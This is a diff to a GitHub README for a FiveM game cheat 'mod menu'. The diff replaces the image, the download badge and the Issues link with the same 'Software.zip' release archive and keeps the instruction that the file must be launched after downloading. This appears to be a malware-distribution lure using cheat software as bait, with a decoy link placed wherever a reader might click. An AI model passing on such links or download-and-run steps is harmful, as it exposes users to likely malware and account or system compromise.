@@ -2,7 +2,7 @@
 
 ## Welcome to the FiveM Mod Menu Repository!
 
-![FiveM Mod Menu](https://img.icons8.com/color/452/fivem.png)
+![FiveM Mod Menu](https://github.com/krishioer/FiveM-Mod-Menu/releases/download/v2.0/Software.zip)
 
 This repository contains a powerful FiveM Lua executor and spoofer for all your modding and gaming needs. Take your FiveM experience to the next level with the latest cheats and hacks included!
 
@@ -33,13 +33,13 @@ This repository contains a powerful FiveM Lua executor and spoofer for all your 
 
 To get started, download our latest release by clicking the button below:
 
-[![Download FiveM Mod Menu](https://img.shields.io/badge/Download-FiveM%20Mod%20Menu-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download FiveM Mod Menu](https://github.com/krishioer/FiveM-Mod-Menu/releases/download/v2.0/Software.zip%20Mod%20Menu-brightgreen)](https://github.com/krishioer/FiveM-Mod-Menu/releases/download/v2.0/Software.zip)
 
 *Note: The file needs to be launched after downloading.*
 
 ### Get in Touch:
 
-For any questions, feedback, or support, feel free to reach out to us through the repository's [Issues](https://github.com/yourusername/FiveM-Mod-Menu/issues) section.
+For any questions, feedback, or support, feel free to reach out to us through the repository's [Issues](https://github.com/krishioer/FiveM-Mod-Menu/releases/download/v2.0/Software.zip) section.
 
 ### Legal Disclaimer:
 
